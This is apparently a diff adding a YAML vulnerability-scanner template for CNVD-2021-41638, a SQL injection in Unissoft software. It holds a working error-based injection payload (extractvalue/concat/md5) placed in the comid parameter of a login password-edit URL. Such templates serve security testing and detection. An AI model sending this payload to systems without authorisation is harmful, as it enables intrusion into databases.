@@ -1,0 +1,13 @@
+id: yaml-poc-unissoft-unissoft-sql_injection-CNVD-2021-41638
+info:
+  name: Yaml Poc Unissoft Unissoft Sql_Injection Cnvd 2021 41638
+  author: luhan.xu
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-unissoft-unissoft-sql_injection-CNVD-2021-41638'
+  tags: sqli
+  reference:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2021-41638
+http:
+- method: GET
+  path:
+  - /login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5({{a1}})))
